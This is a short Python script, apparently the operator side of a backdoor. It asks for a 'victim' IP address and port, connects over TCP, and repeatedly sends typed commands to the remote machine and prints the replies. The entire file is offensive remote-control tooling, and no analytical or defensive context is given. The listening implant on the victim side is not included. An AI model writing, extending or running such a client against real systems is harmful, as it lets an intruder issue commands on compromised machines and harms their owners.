#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
login = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = input("IP victim: ")
port = int(input("Port: "))
login.connect((host, port))
print("Connection to IP {} port {} established.".format(host, port))
started = True

while started:
    choice = int(input("1. to send an order\n 2. for quit\n >>>"))
    if choice == 1:
        command = input("insert command")
        login.send(command.encode())
        retour = login.recv(1024).decode('latin1')
        print(retour)

    if choice == 2:
        login.send(b"exit")
        login.close()
        break